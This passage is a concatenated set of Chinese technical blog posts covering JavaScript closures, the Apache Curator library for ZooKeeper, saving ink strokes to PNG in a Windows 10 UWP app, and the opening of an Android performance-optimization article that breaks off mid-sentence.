//声明函数b，b能访问函数a的变量\n    function b(){\n        console.log(val_a);\n    }\n    //a函数将b返回\n    return b;\n}\n\n//全局变量fn，a执行返回了b给fn\nvar fn = a();\n//调用fn，能够在全局作用域访问a函数里的变量\nfn();  //我是a函数里的变量\n\n这里fn能够访问到a的变量，因为b中引用着a的活动对象，所以即使a函数执行完了，a的活动对象还是不会被销毁的。这也说明过度使用闭包会导致内存泄漏。\n\n再来个常见的例子（给多个li添加点击事件，返回对于li的下标）：\n<body>\n    <ul id=\"list\">\n        <li>red</li>\n        <li>green</li>\n        <li>yellow</li>\n        <li>black</li>\n        <li>blue</li>\n    </ul>\n</body>\n//获得li标签组\nvar li_group = document.getElementsByTagName('li');\n\n//错误例子:每个li都会跳出5\nfunction fn(){\n    //为每一个li添加点击事件\n    var i = 0;\n    //使用for来给每个li添加事件\n    for(;i<li_group.length;i++){\n        //添加点击事件\n        li_group[i].addEventListener('click',function(){\n            // 输出对应得下标\n            console.log(i);\n        });\n    }\n}\nfn();\n\n\n//正确的例子：\n//在加一层的函数，作为闭包，用来保存每一次循环的i变量，就可以达到目的\nfunction correctFn(){\n    var i = 0;\n    for(;i<li_group.length;i++){\n        //在外面套一层函数，这层函数会保存每次循环的i变量，也就是闭包了。\n        (function(num){\n            li_group[num].addEventListener('click',function(){\n                console.log(num);\n            });               \n        }(i));        \n    }\n}\ncorrectFn();\n看下面解释之前我默认你已经知道活动对象是什么了，如果不懂可以看这篇：深入理解js执行--创建执行上下文\n解释一下：\n1.错误的例子:\n屡一下思路，每个li都有click执行的函数，每个函数点击后才会执行是吧，那每个click的函数的外层函数是fn这个函数，那这5个click函数都会保存着fn的活动对象，那这个输出的i变量在fn这函数里面，所以当fn执行完后，i的值是5了，因此当每个里触发click的函数的时候输出的也就是5了。\n再简单的说：每个li的click事件触发的函数引用的i在同一个活动对象中，所以值都一样。\n2.正确执行的例子：\n我们就在外层加了一层匿名函数并立即执行(虽然函数被执行了，如果有函数引用着它的活动对象，那其活动对象将不灭)，这时每个li的click函数外层函数是每次循环产生的不同的匿名函数，这匿名也是有活动对象，每个li的click的函数保存着各自的匿名函数的活动对象，num这变量也根据每次循环产生不同的匿名函数传入的i的不同而不同，所以能够输出对应不同的值。\n\n上面说的可能有点啰嗦，请原谅我[捂脸.jpg]，我是希望尽可能的表达清楚。如果你看懂了，那对闭包的理解也更深一层了哦。\n\n小结：\n\n1.本篇主要讲的是闭包，闭包是有权访问另一个函数作用域中的变量的函数，主要是函数中的函数，因为能引用外层函数的活动对象所以能够访问其外层的变量。\n2.我本篇主要讲的是原理，如果对一些东西不懂，可以看下面几篇。\n\n\n相关的几篇：\n深入理解js执行--单线程的JS\n深入学习JS执行--创建执行上下文（变量对象，作用域链，this）\n我发现，原来你是这样的JS全部文章汇总（点击此处）\n\n\n本文出自博客园：http://www.cnblogs.com/Ry-yuan/\n作者：Ry（渊源远愿）\n欢迎访问我的个人首页：我的首页\n欢迎访问我的github:https://github.com/Ry-yuan/demoFiles\n欢迎转载，转载请标明出处，保留该字段。\n\n"},{"title":"15. 使用Apache Curator管理ZooKeeper","body":"Apache ZooKeeper是为了帮助解决复杂问题的软件工具，它可以帮助用户从复杂的实现中解救出来。 然而，ZooKeeper只暴露了原语，这取决于用户如何使用这些原语来解决应用程序中的协调问题。 社区已经在ZooKeeper数据模型及其API之上开发了高级框架。 Apache Curator是一个高级的包装类库和框架，使得ZooKeeper非常简单易用。\n\nTips\nCurator最初由Netflix开发，现在是一个Apache项目。 项目页面位于http://curator.apache.org/。\n\n一 Curator组件\nCurator是ZooKeeper的高级类库；它使处理ZooKeeper变得更容易，并扩展了核心ZooKeeper的功能。 Curator在高层次上由以下部分组成：\n\nClient：Curator客户端是ZooKeeper的Java客户端的一个包装器。 它是Curator堆栈中的一个低级API，并且抽象出ZooKeeper客户端的功能。\nFramework：Curator框架是一个具有高级功能的高级API，如自动连接管理，操作重试等等。 它在很大程度上简化了ZooKeeper的使用。\nRecipe：Curator Recipe提供ZooKeeper Recipe的实现； 这些实现可以直接用于分布式应用程序来解决协调问题。\nExtensions：Curator Recipe包实现了常见的Recipe。 为了避免这个包的膨胀，使用一个单独的扩展包。\n\n除了前面的组件外，Curator还附带一些ZooKeeper有用的工具。 Curator堆栈如下图所示：\n\nCurator JARs可以在Maven Central的仓库中找到。 Curator可以很容易地包含在Maven，Gradle，Ivy，SBT等构建脚本中。\n各种Maven artifacts在http://mvnrepository.com/artifact/org.apache.curator上列出。\n二 Curator客户端\nCurator Client是ZooKeeper Java客户端的一个包装器。它使客户端访问ZooKeeper更简单，更不易出错。\nCurator客户端提供以下功能：\n\n连接管理：管理与ZooKeeper服务器的连接\n操作重试实用程序：这是重试操作的机制\n测试ZooKeeper服务器：这是用于测试ZooKeeper服务器\n\n使用Curator客户端连接ZooKeeper服务器的MyCuratorClient.java的代码片段如下：\npublic void myCuratorClient() throws Exception\n{\n  CuratorZookeeperClient client = new CuratorZookeeperClient(server.getConnectString(), 10000, 10000, null,new RetryOneTime(1));\n  client.start();\n  try\n  {\n    client.blockUntilConnectedOrTimedOut();\n    String path = client.getZooKeeper().create(\"/test_znode\", \"\".getBytes(),ZooDefs.Ids.OPEN_ACL_UNSAFE, CreateMode.PERSISTENT);\n  }\n  finally\n  {\n    client.close();\n  }\n}\nCuratorZooKeeperClient构造方法用于连接到ZooKeeper服务器。 它需要连接字符串或ZooKeeper主机端口对列表，会话和连接超时时间，可选的观察器对象以及要使用的重试策略。 重试策略是客户端在重试连接时尝试各种重试机制的机制。在前面的例子中，使用了一个客户端只会重试一次的策略。\nCurator客户端支持以下重试策略：\n\nBoundedExponentialBackoffRetry：通过增加重试之间的休眠时间直到最大上限重试指定的次数\nExponentialBackoffRetry：通过增加重试之间的休眠时间来重试指定的次数\nRetryNTimes：重试n次\nRetryOneTime：只重试一次\nRetryUntilElapsed：一直重试，直到超过指定时间\n\n一旦客户端启动，blockUntilConnectedOrTimedOut方法直到ZooKeeper连接服务器成功或者连接超时。连接成功之后，创建/testznode的znode。getZooKeeper()方法将连接的实例返回给托管的ZooKeeper服务器。\n\nNote\nCurator API文档可在http://curator.apache.org/apidocs/index.html察看。\n\nCurator客户端是一个低层次的API，它提供了对管理员客户端API的抽象。开发人员应该使用Curator框架，而不是直接在他们的应用程序中使用CuratorZookeeperClient类作为最佳实践。\n三 Curator框架\nCurator框架（org.apache.curator.framework）是一个高层次的API，很大程度上简化了ZooKeeper的使用。 它提供的一些功能如下：\n\n自动连接管理：此功能自动且透明地处理客户端需要重新建立与ZooKeeper服务器的连接和/或重试操作的场景。\n简单而灵活的API：使用一组新式且流畅的接口来应用ZooKeeper原始的API。\nRecipe：这个功能实现了常见的ZooKeeper Recipe。\n\nCuratorFramework使用CuratorFrameworkFactory进行分配。 它提供了工厂方法以及构造器创建实例。CuratorFramework实例完全是线程安全的。在使用CuratorFramework开发应用程序时，开发人员应该为每个ZooKeeper集群创建和共享一个CuratorFramework实例。CuratorFramework使用fluent风格接口。\n以下展示的是ZooKeeper客户端使用CuratorFramework的代码示例：\npublic void myCuratorFrameworkClient()\nthrows Exception\n{\n  CuratorFramework client =\n  CuratorFrameworkFactory.newClient(server.getConnectString(), new RetryOneTime(1));\n  client.start();\n  try\n  {\n    String path = client.create().withMode(\n    CreateMode.PERSISTENT).forPath(\n    \"/test_znode\", \"\".getBytes());\n  }\n  finally\n  {\n    client.close();\n  }\n}\nnewClient()工厂方法创建一个新的客户端实例，默认会话超时和默认连接超时。 它需要一个连接字符串，是ZooKeeper主机-端口对列表和要使用的重试策略。\nCuratorFramework有一个命名空间的概念。 通过这个，可以在使用构造器方法创建CuratorFramework实例时设置命名空间。 当其中一个API被调用时，该框架将该命名空间预加载到所有路径：\nCuratorFrameworkFactory.Builder builder = CuratorFrameworkFactory.builder();\nCuratorFramework client = builder.connectString (server.getConnectString()).namespace(\"MyApp\").retryPolicy(new RetryOneTime(1)).build();\nclient.create().forPath(\"/test_znode\", data);\n在这里，尽管znode的名称被指定为/test_znode，但是创建的实际znode是/MyApp/test_znode。\nCurator框架还提供了一个名为CuratorTempFramework的有限功能框架接口，用于通过不可靠的网络（如WAN）进行临时连接。 在这个框架中，如果会话保持空闲一段时间，ZooKeeper连接将被关闭。\n四 Curator recipe\nCurator为ZooKeeper提供了一系列随时可用的recipe。 Curator实现的recipe的详细列表和描述可以从http://curator.apache.org/curator-recipes/index.html的项目页面中获取。\n在这里，将简略地介绍一下ZooKeeper的recipe：\n\n领导者选举：Curator为领导选举提供了两种算法：领导者锁定（leader latch）和领导者选择（ leader selector）。两种算法在连接到Zookeeper集群的多个竞争者中选择一个“领导者”。\n在领导者锁定中，如果一组n个参与者与竞争领导，则将n个参与者中的一个随机分配为领导，而在领导选择中，按照到达该Zookeeper服务器的请求的顺序来选择领导。 当领导者解除领导时，选择集群中的n个参与者的另一个竞争者。\n锁：Curator实现以下不同类型的分布式锁：\n\n共享重入锁：这种类型的锁提供全局同步的全分布锁。\n共享锁：这是非重入共享重入锁。\n共享重入读/写锁：这是一个可跨JVM使用的重入读/写互斥锁。\n共享信号量：这是一个计数信号量（semaphore），可以跨JVM使用。\n多锁共享：这是用来管理多个锁作为一个单一的实体。 acquire()调用获取所有的锁。 如果呼叫失败，所有获得的路径被释放。 release()调用释放所有托管的锁。\n\n屏障（Barrier）：这是屏障和双重屏障的具体实现。\n计数器：提供了一种机制来管理共享计数器的共享整数。它还给出了分布式原子增量的分布式原子长整型，分布式原子整型和分布式原子值的机制。\n缓存：缓存是通过路径缓存，节点缓存和树缓存recipe实现的，分别保存ZK路径的znode，本地缓存节点和所有本地缓存的子节点的状态变化数据。\n队列：这提供了分布式队列实现。 支持以下不同类型的队列：\n\n分布式队列：这是一个简单的分布式队列，其中放入队列中的条目是在FIFO中排序的。\n分布式ID队列：这是一个分布式队列的版本，允许一些标识符与队列项相关联。\n分布式优先级队列:这是ZooKeeper的分布式优先级队列的实现。在内部，它使用一个分布式队列，其中可以将优先级指定给项目。\n分布式延迟队列：这是使用时间作为优先级的分布式优先级队列的变体。当将条目添加到队列时，会给出一个延迟值。直到超过延迟时间，该项目将被发送给消费者。\n简单的分布式队列：这是ZooKeeper分布式org.apache.zookeeper.recipes.queue.DistributedQueue队列的一部分替代实现。\n\n节点：这提供了一个persistent ephemeral节点的recipe；这是一个ephemeral的节点，即使在连接和会话中断的情况下也会试图保持在ZooKeeper中。\n\n五 Curator实用程序\nCurator类库也为ZooKeeper提供了一些有用的工具。 其中一些如下所示：\n\nTest server：这是一个可用于本地进程ZooKeeper服务器的测试\nTest cluster：这是一个内部运行的用于ZooKeeper服务器ensemble的测试\nZKPaths：提供了各种使用ZooKeeper znode路径的静态方法\nEnsurePath：确保在使用之前创建特定znode路径的实用程序\nBlockingQueueConsumer：一个类似于Java中的BlockingQueue的队列消费者\nReaper：删除没有子节点的路径和没有数据的节点的实用程序\n\n六 Curator扩展\nCurator扩展包除了包含在recipe包中那些外，还包括额外的recipe。 扩展包中的recipe具有curator-x-name的命名约定。\nCurator目前提供以下扩展功能：\n\nService discovery：这是一个使用ZooKeeper作为服务发现机制的系统。\nService discovery server：这是一个使用REST服务进行非Java和遗留程序的Curator服务发现。 它公开RESTful Web服务来注册，删除和查询服务。\nCurator RPC proxy：该模块实现了一个代理，将非Java环境与Curator框架和recipe桥接在一起。 它使用Apache Thrift，使大量的语言和环境使用Curator的功能，并统一ZooKeeper跨语言/环境的用法。\nZKClient bridge：这个扩展是Curator和ZKClient之间的桥梁（https://github.com/sgroschupf/zkclient）。 使用ZKClient编写的应用程序在不改变现有代码的情况下使用Curator类库会非常有用。 ZKClient bridge不作为Curator分发的一部分进行打包。 它可以在它自己的Maven中心存储库中的curator-x-zkclient-bridge中找到。\n\n到目前为止，我们已经了解Curator类库及其各种组件。Curator为ZooKeeper API实现了一个非常好的，可靠的扩展，将ZooKeeper的许多复杂性抽象出来。 强烈建议开发人员使用Curator在Java语言的ZooKeeper开发分布式应用程序。 不仅如此，Curator的强大功能也可以从Java以外的语言编写的应用程序中使用。\n"},{"title":"【Win 10 应用开发】将墨迹保存到图像的两种方法","body":"IT界最近这几年，各种乱七八糟的东西不断出现，其中能用在实际工作与生活中的，大概也就那么几个。Web 前端也冒出各种框架，这就为那些喜欢乱用框架的公司提供了很好的机会，于是造成很多项目体积越来越庞大，越来越难维护。一切变得越来越没有标准，所以，很多公司在招聘码农时就特能乱写，还要求你精通 AA，BB，CC，DD，EE，FF，GG……甚至有的不下二三十项要求。老周觉得这些公司基本上是神经病，先不说世界没有人能精通那么多东西，就算真有人能精通那么多，那估计这个人也活不久了，早晚得累死的。\n实际上，Web 前端你能学会三样东西就够了——HTML、CSS、JS，其他纯属娱乐。\n所以，学习编程的话，你抓几个有代表性地学就好了，比如C/C++，.net，PHP，Java 这些，其余的嘛，现学现用，用完就扔。你要是想让自己变成高手的话，那你就必须挑一个方向，纵向深度发展。什么都学等于什么都不通，学乱七八糟的东西是成不了高手的。就拿黑客这一活儿来说，只有第一代，第二代黑客比较强，后面的基本是菜鸟，一代不如一代。没办法，浮躁的时代，IT业也不可幸免的。\n \n好了，上面的都是P话，下面老周开始说正题，今天咱们谈谈如何将电子墨迹保存到图像。在近年来出现的各种花拳绣腿技术中，电子墨迹还算是有实用价值的东西。还有触控、虚拟化这些，也有一定的用途。人工智障倒是可有可无，可作为辅助，但不太可靠，最起码它代替不了人脑（笨蛋例外），我估计将来搞艺术可能吃香，毕竟机器是不懂艺术的。普工可能会大量失业，因为他们做的事情可以让机器做了（主要是重复性，机械性的工作）。\n拿笔写字是人的本能，千万不要鼠标键盘用多了连笔都拿不动（这已经是“鼠标手”的轻度症状了，不及时治疗，以后会很难看的）。科技再发达，人类的本能绝不能丢，就好比哪天你连穿衣吃饭都不会了，那你活该饿死。\n本文就介绍两种比较简单的方法：\n第一种是运用 win 2D 封装的功能来完成。老周做的那个“练字神器”应用就是用这种方法保存你的书法作品的，其中的宣纸纸纹原理也很简单，就是分层绘制，首先在底层绘制纸张的纹理图案，然后再把墨迹绘制到底纹之上即可。\n第二种不需要借助其他 Nuget 上的库，只要使用 1709 最新的 API 就能实现。\n \n \n先说第一种方案。\n为了演示，老周就做简单一点。下面 XAML 代码在界面上声明了一个 InkCanvas ，用来收集输入的墨迹，然后一个 Button ，点击后选择文件路径，然后保存为 png 图片。\n\n    <Grid Background=\"{ThemeResource ApplicationPageBackgroundThemeBrush}\">\n        <Grid.RowDefinitions>\n            <RowDefinition/>\n            <RowDefinition Height=\"auto\"/>\n        </Grid.RowDefinitions>\n        <InkCanvas Name=\"inkcv\"/>\n        <Button Content=\"保存墨迹\" Click=\"OnClick\"  Grid.Row=\"1\" Margin=\"2,9.5\"/>\n    </Grid>\n\n接着，你要打开 nuget 管理器，向项目添加 Win 2D 的引用。这个老周不多说了，你懂怎么操作的。\n如果你绘制的墨迹图像需要在界面上显示，可以用 CanvasControl 控件，然后处理 Draw 事件，如果不需要在界面上显示，例如这个例子，我们是直接保存为图像文件的，所以不需要在界面上添加 CanvasControl 元素了。\n前面在写 UI Composition 的文章时，老周曾用过 Win 2D 做演示，负责绘制操作的是 CanvasDrawingSession 类，其中，你会发现，它有一个方法叫 DrawInk，对的，我们用的就是它，它可以把我们从用户输入收集到的墨迹绘制下来。它有两个重载，其中一个是指定是否绘制成高对比度模式。\n好，理论上的屁话不多说，我直接上代码，你一看就懂的。\n不过，在页面类的构造函数中，我们得先设置一下书写的参数，比如笔触大小、颜色等。\n\n        public MainPage()\n        {\n            this.InitializeComponent();\n            // 支持笔，手触，鼠标输入\n            inkcv.InkPresenter.InputDeviceTypes = Windows.UI.Core.CoreInputDeviceTypes.Mouse | Windows.UI.Core.CoreInputDeviceTypes.Pen | Windows.UI.Core.CoreInputDeviceTypes.Touch;\n            // 设定笔迹颜色为红色\n            InkDrawingAttributes data = new InkDrawingAttributes();\n            data.Color = Colors.Red;\n            // 笔触大小\n            data.Size = new Size(15d, 15d);\n            // 忽略笔的倾斜识别，毕竟只有新型的笔才有这感应\n            data.IgnoreTilt = true;\n            // 更新参数\n            inkcv.InkPresenter.UpdateDefaultDrawingAttributes(data);\n        }\n\n \n随后就可以处理 Button 的 Click 事件了。\n\n        private async void OnClick(object sender, RoutedEventArgs e)\n        {\n            // 如果没有输入墨迹，那就别浪费 CPU 时间了\n            if(inkcv.InkPresenter.StrokeContainer.GetStrokes().Any() == false)\n            {\n                return;\n            }\n\n            // 选择保存文件\n            FileSavePicker picker = new FileSavePicker();\n            picker.FileTypeChoices.Add(\"PNG 图像\", new string[] { \".png\" });\n            picker.SuggestedFileName = \"sample\";\n            picker.SuggestedStartLocation = PickerLocationId.Desktop;\n            StorageFile file = await picker.PickSaveFileAsync();\n            if (file == null) return;\n\n            // 建一个在内存中用的画板（不显示在 UI 上）\n            // 获取共享的 D2D 设备引用\n            CanvasDevice device = CanvasDevice.GetSharedDevice();\n            // 图像大小与 InkCanvas 控件大小相同\n            float width = (float)inkcv.ActualWidth;\n            float height = (float)inkcv.ActualHeight;\n            // DPI 为 96\n            float dpi = 96f;\n            CanvasRenderTarget drawtarget = new CanvasRenderTarget(device, width, height, dpi);\n            // 开始作画\n            using(var drawSession = drawtarget.CreateDrawingSession())\n            {\n                // 我们上面设置了用的是红笔\n                // 为了生成图片后看得清楚\n                // 把墙刷成白色\n                drawSession.Clear(Colors.White);\n                // 画墨迹\n                drawSession.DrawInk(inkcv.InkPresenter.StrokeContainer.GetStrokes());\n            }\n            // 保存到输出文件\n            await drawtarget.SaveAsync(await file.OpenAsync(FileAccessMode.ReadWrite), CanvasBitmapFileFormat.Png, 1.0f);\n            // 释放资源\n            drawtarget.Dispose();\n        }\n\n \n运行应用后，随便写点啥上去。如下图。\n\n \n 然后点击按钮，保存一下。生成的图片如下图所示。\n\n \n \n 好，第一种方案完结，接下来咱们用第二种方案。\n这是 1709 （秋季创作者更新）的新功能。新的 SDK 中增加了一个 CoreInkPresenterHost 类（位于 Windows.UI.Input.Inking.Core 命名空间），使用这类，你可以不需要 InkCanvas 控件，你可以把墨迹接收图面放到任意的 XAML 元素上。因为该类公开一个 RootVisual 属性，注意它不是指向 XAML 可视化元素，而是 ContainerVisual 对象。这是 UI Composition 中的容器类。\n老周前不久刚写过一堆与 UI Composition 有关的文章，如果你不了解相关内容，可以看老周前面的烂文。通过前面对 UI Composition 的学习，我们知道，可以将可视化对象添加到任意 XAML 可视化元素上。对，这个 CoreInkPresenterHost 类就是运用了这个特点，使得墨迹收集可以脱离 InkCanvas 控件，以后，你爱在哪个元素上收集墨迹都行，比如，你想让用户可以对图像进行涂鸦，你就可以把这个类放到 Image 元素上。\nP话少说，咱们来点干货。下面的例子，其界面和前一个例子相似，只是没有用上 InkCanvas 控件，而只是声明了个 Border 元素。\n\n    <Grid Background=\"{ThemeResource ApplicationPageBackgroundThemeBrush}\">\n        <Grid.RowDefinitions>\n            <RowDefinition/>\n            <RowDefinition Height=\"auto\"/>\n        </Grid.RowDefinitions>\n        <Border Name=\"bd\" Margin=\"3\" BorderThickness=\"1\" BorderBrush=\"Green\"/>\n        <Button Grid.Row=\"1\" Margin=\"4,8\" Content=\"保存墨迹\" Click=\"OnClick\"/>\n    </Grid>\n\n然后切换到代码文件，在页面类的构造函数中，进行一下初始化。初始化的东西挺多，包括用 Compositor 创建用来承载墨迹的容器 Visual ，以及设置笔触参数。\n\n        CoreInkPresenterHost inkHost = null;\n        public MainPage()\n        {\n            this.InitializeComponent();\n\n            // 组装一个 UI，把一个可视化容器放到 Border 上\n            Visual bdvisual = ElementCompositionPreview.GetElementVisual(bd);\n            var compositor = bdvisual.Compositor;\n            // 创建一个容器\n            ContainerVisual inkContainer = compositor.CreateContainerVisual();\n            // 此时因为各元素的宽度和高度都为0，所以用动画来更新容器的大小\n            var expressAnimate = compositor.CreateExpressionAnimation();\n            expressAnimate.Expression = \"bd.Size\";\n            expressAnimate.SetReferenceParameter(\"bd\", bdvisual);\n            inkContainer.StartAnimation(\"Size\", expressAnimate);\n            // 设置容器与 Border 关联\n            ElementCompositionPreview.SetElementChildVisual(bd, inkContainer);\n\n            // 处理墨迹收集关联\n            inkHost = new CoreInkPresenterHost();\n            inkHost.RootVisual = inkContainer;\n            inkHost.InkPresenter.InputDeviceTypes = Windows.UI.Core.CoreInputDeviceTypes.Mouse | Windows.UI.Core.CoreInputDeviceTypes.Pen | Windows.UI.Core.CoreInputDeviceTypes.Touch;\n            // 设置笔触参数\n            InkDrawingAttributes attrib = new InkDrawingAttributes();\n            attrib.Color = Colors.SkyBlue;\n            attrib.Size = new Size(15f, 15f);\n            attrib.IgnoreTilt = true;\n            // 更新参数\n            inkHost.InkPresenter.UpdateDefaultDrawingAttributes(attrib);\n        }\n\n创建了容器 Visual 后，记得要通过 CoreInkPresenterHost 对象的 RootVisual 属性来关联。当然你不能忘了把这个 visual 加到 Border 的子元素序列上。\n现在处理 Click 事件，用 RenderTargetBitmap 类，把 Border 的内容画出来，这样会连同它上面的墨迹也一起画出来。\n\n            // 这个类可以绘制 XAML 元素，以前介绍过\n            RenderTargetBitmap rtarget = new RenderTargetBitmap();\n            await rtarget.RenderAsync(bd);\n\n然后用图像编码器写入文件就行了。\n\n            // 获取像素数据\n            var pxBuffer = await rtarget.GetPixelsAsync();\n            // 开始为图像编码\n            using(var stream = await outFile.OpenAsync(FileAccessMode.ReadWrite))\n            {\n                BitmapEncoder encoder = await BitmapEncoder.CreateAsync(BitmapEncoder.PngEncoderId, stream);\n                encoder.SetPixelData(BitmapPixelFormat.Bgra8, BitmapAlphaMode.Premultiplied, (uint)rtarget.PixelWidth, (uint)rtarget.PixelHeight, 96d, 96d, pxBuffer.ToArray());\n                await encoder.FlushAsync();\n            }\n\n \n完整的事件处理代码如下。\n\n        private async void OnClick(object sender, RoutedEventArgs e)\n        {\n            if (inkHost.InkPresenter.StrokeContainer.GetStrokes().Any() == false)\n                return;\n\n            FileSavePicker picker = new FileSavePicker();\n            picker.FileTypeChoices.Add(\"PNG 图像文件\", new string[] { \".png\" });\n            picker.SuggestedFileName = \"sample\";\n\n            StorageFile outFile = await picker.PickSaveFileAsync();\n            if (outFile == null)\n                return;\n\n            // 这个类可以绘制 XAML 元素，以前介绍过\n            RenderTargetBitmap rtarget = new RenderTargetBitmap();\n            await rtarget.RenderAsync(bd);\n            // 获取像素数据\n            var pxBuffer = await rtarget.GetPixelsAsync();\n            // 开始为图像编码\n            using(var stream = await outFile.OpenAsync(FileAccessMode.ReadWrite))\n            {\n                BitmapEncoder encoder = await BitmapEncoder.CreateAsync(BitmapEncoder.PngEncoderId, stream);\n                encoder.SetPixelData(BitmapPixelFormat.Bgra8, BitmapAlphaMode.Premultiplied, (uint)rtarget.PixelWidth, (uint)rtarget.PixelHeight, 96d, 96d, pxBuffer.ToArray());\n                await encoder.FlushAsync();\n            }\n        }\n\n \n好，完事了，现在运行一下，直接中 Border 元素上写点东东。\n\n \n然后点击底部的按钮保存为图片，如下图所示。\n\n \n \nOK，本文就扯到这里了，开饭，不然饭菜凉了。\n "},{"title":"Android APP 性能优化的一些思考","body":"说到 Android 系统手机，大部分人的印象是用了一段时间就变得有点卡顿，有些程序在运行期间莫名其妙的出现崩溃，打开系统文件夹一看，发现多了很多文件，然后用手机管家 APP 不断地进行清理优化 ，才感觉运行速度稍微提高了点，就算手机在各种性能跑分软件面前分数遥遥领先，还是感觉无论有多大的内存空间都远远不够用。相信每个使用 Android 系统的用户都有过以上类似经历，确实，Android 系统在流畅性方面不如 IOS 系统，为何呢，明明在看手机硬件配置上时，Android 设备都不会输于 IOS 设备，甚至都强于它，关键是在于软件上。造成这种现象的原因是多方面的，简单罗列几点如下：\n\n其实近年来，随着 Android 版本不断迭代，Google 提供的Android 系统已经越来越流畅，目前最新发布的版本是 Android 8.0 Oreo 。但是在国内大部分用户用的 Android 手机系是各大厂商定制过的版本，往往不是最新的原生系统内核，可能绝大多数还停留在 Android 5.0 系统上，甚至 Android 6.0 以上所占比例还偏小，更新存在延迟性。\n由于 Android 系统源码是开放的，每个人只要遵从相应的协议，就可以对源码进行修改，那么国内各个厂商就把基于 Android 源码改造成自己对外发布的系统，比如我们熟悉的小米手机 Miui 系统、华为手机 EMUI 系统、Oppo 手机 ColorOS 系统等。由于每个厂商都修改过 Android 原生系统源码，这里面就会引发一个问题，那就是著名的Android 碎片化问题，本质就是不同 Android 系统的应用兼容性不同，达不到一致性。\n由于存在着各种 Android 碎片化和兼容性问题，导致 Android 开发者在开发应用时需要对不同系统进行适配，同时每个 Android 开发者的开发水平参差不齐，写出来的应用性能也都存在不同类型的问题，导致用户在使用过程中用户体验感受不同，那么有些问题用户就会转化为 Android 系统问题，进而影响对Android 手机的评价。\n\n性能优化\n今天想说的重点是Android APP  性能优化，也就是在开发应用程序时应该注意的点有哪些，如何更好地提高用户体验。一个好的应用，除了要有吸引人的功能和交互之外，在性能上也应该有高的要求，即时应用非常具有特色，在产品前期可能吸引了部分用户，但是用户体验不好的话，也会给产品带来不好的口碑。那么一个好的应用应该如何定义呢？主要有以下三方面：\n\n业务/功能\n符合逻辑的交互\n优秀的性能\n\n众所周知，Android 系统作为以移动设备为主的操作系统，硬件配置是有一定的限制的，虽然配置现在越来越高级，但仍然无法与 PC 相比，在 CPU 和内存上使用不合理或者耗费资源多时，就会碰到内存不足导致的稳定性问题、CPU 消耗太多导致的卡顿问题等。\n面对问题时，大家想到的都是联系用户，然后查看日志，但殊不知有关性能类问题的反馈，原因也非常难找，日志大多用处不大，为何呢？因为性能问题大部分是非必现的问题，问题定位很难复现，而又没有关键的日志，当然就无法找到原因了。这些问题非常影响用户体验和功能使用，所以了解一些性能优化的一些解决方案就显得很重要了，并在实际的项目中优化我们的应用，进而提高用户体验。\n四个方面\n可以把用户体验的性能问题主要总结为4个类别：\n\n流畅\n稳定\n省电、省流量\n安装包小\n\n性能问题的主要原因是什么，原因有相同的，也有不同的，但归根到底，不外乎内存使用、代码效率、合适的策略逻辑、代码质量、安装包体积这一类问题，整理归类如下：\n\n从图中可以看到，打造一个高质量的应用应该以4个方向为目标：快、稳、省、小。\n快：使用时避免出现卡顿，响应速度快，减少用户等待的时间，满足用户期望。\n稳：减低 crash 率和 ANR 率，不要在用户使用过程中崩溃和无响应。\n省：节省流量和耗电，减少用户使用成本，避免使用时导致手机发烫。\n小：安装包小可以降低用户的安装成本。\n要想达到这4个目标，具体实现是在右边框里的问题：卡顿、内存使用不合理、代码质量差、代码逻辑乱、安装包过大，这些问题也是在开发过程中碰到最多的问题，在实现业务需求同时，也需要考虑到这点，多花时间去思考，如何避免功能完成后再来做优化，不然的话等功能实现后带来的维护成本会增加。\n卡顿优化\nAndroid 应用启动慢，使用时经常卡顿，是非常影响用户体验的，应该尽量避免出现。卡顿的场景有很多，按场景可以分为4类：UI 绘制、应用启动、页面跳转、事件响应，如图：\n\n这4种卡顿场景的根本原因可以分为两大类：\n\n界面绘制。主要原因是绘制的层级深、页面复杂、刷新不合理，由于这些原因导致卡顿的场景更多出现在 UI 和启动后的初始界面以及跳转到页面的绘制上。\n数据处理。导致这种卡顿场景的原因是数据处理量太大，一般分为三种情况，一是数据在处理 UI 线程，二是数据处理占用 CPU 高，导致主线程拿不到时间片，三是内存增加导致 GC 频繁，从而引起卡顿。\n\n引起卡顿的原因很多，但不管怎么样的原因和场景，最终都是通过设备屏幕上显示来达到用户，归根到底就是显示有问题，所以，要解决卡顿，就要先了解 Android 系统的显示原理。\nAndroid系统显示原理\nAndroid 显示过程可以简单概括为：Android 应用程序把经过测量、布局、绘制后的 surface 缓存数据，通过 SurfaceFlinger 把数据渲染到显示屏幕上， 通过 Android 的刷新机制来刷新数据。也就是说应用层负责绘制，系统层负责渲染，通过进程间通信把应用层需要绘制的数据传递到系统层服务，系统层服务通过刷新机制把数据更新到屏幕上。\n我们都知道在 Android 的每个 View 绘制中有三个核心步骤：Measure、Layout、Draw。具体实现是从 ViewRootImp 类的performTraversals() 方法开始执行，Measure 和 Layout都是通过递归来获取 View 的大小和位置，并且以深度作为优先级，可以看出层级越深、元素越多、耗时也就越长。\n真正把需要显示的数据渲染到屏幕上，是通过系统级进程中的 SurfaceFlinger 服务来实现的，那么这个SurfaceFlinger 服务主要做了哪些工作呢？如下：\n\n响应客户端事件，创建 Layer 与客户端的 Surface 建立连接。\n接收客户端数据及属性，修改 Layer 属性，如尺寸、颜色、透明度等。\n将创建的 Layer 内容刷新到屏幕上。\n维持 Layer 的序列，并对 Layer 最终输出做出裁剪计算。\n\n既然是两个不同的进程，那么肯定是需要一个跨进程的通信机制来实现数据传递，在 Android 显示系统中，使用了 Android 的匿名共享内存：SharedClient，每一个应用和 SurfaceFlinger 之间都会创建一个SharedClient ，然后在每个 SharedClient 中，最多可以创建 31 个 SharedBufferStack，每个 Surface 都对应一个 SharedBufferStack，也就是一个 Window。\n一个 SharedClient 对应一个Android 应用程序，而一个 Android 应用程序可能包含多个窗口，即 Surface 。也就是说 SharedClient 包含的是 SharedBufferStack的集合，其中在显示刷新机制中用到了双缓冲和三重缓冲技术。最后总结起来显示整体流程分为三个模块：应用层绘制到缓存区，SurfaceFlinger 把缓存区数据渲染到屏幕，由于是不同的进程，所以使用 Android 的匿名共享内存 SharedClient 缓存需要显示的数据来达到目的。\n除此之外，我们还需要一个名词：FPS。FPS 表示每秒传递的帧数。在理想情况下，60 FPS 就感觉不到卡，这意味着每个绘制时长应该在16 ms 以内。但是 Android 系统很有可能无法及时完成那些复杂的页面渲染操作。Android 系统每隔 16ms 发出 VSYNC 信号，触发对 UI 进行渲染，如果每次渲染都成功，这样就能够达到流畅的画面所需的 60FPS。如果某个操作花费的时间是 24ms ，系统在得到 VSYNC 